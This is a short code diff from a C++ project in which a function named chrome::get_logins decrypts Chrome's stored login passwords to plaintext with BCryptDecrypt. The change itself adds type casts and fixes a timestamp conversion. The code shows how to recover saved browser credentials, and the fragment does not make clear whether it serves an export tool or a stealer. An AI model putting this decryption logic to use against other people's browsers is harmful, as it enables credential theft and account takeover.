@@ -104,10 +104,10 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         std::string password_plaintext(ciphertext.size(), '\0');
         BCryptDecrypt(
                 key.get(),
-                ciphertext.data(), ciphertext.size(),
+                ciphertext.data(), (ULONG)ciphertext.size(),
                 &auth_info,
                 NULL, 0,
-                reinterpret_cast<PUCHAR>(password_plaintext.data()), password_plaintext.size(),
+                reinterpret_cast<PUCHAR>(password_plaintext.data()), (ULONG)password_plaintext.size(),
                 &bytes_copied,
                 0);
         password_plaintext.resize(password_plaintext.size() - 16);
@@ -130,7 +130,7 @@ std::expected<std::vector<login>, browser_error> chrome::get_logins(void) {
         // db_date_last_used can be 0 if never used, so check before converting to unix time
         system_clock::time_point date_last_used{};
         if (db_date_last_used != 0) {
-            date_last_used = {microseconds{db_date_last_used} - epoch_offset};
+            date_last_used = system_clock::time_point{microseconds{db_date_last_used} - epoch_offset};
         }
 
         login l;
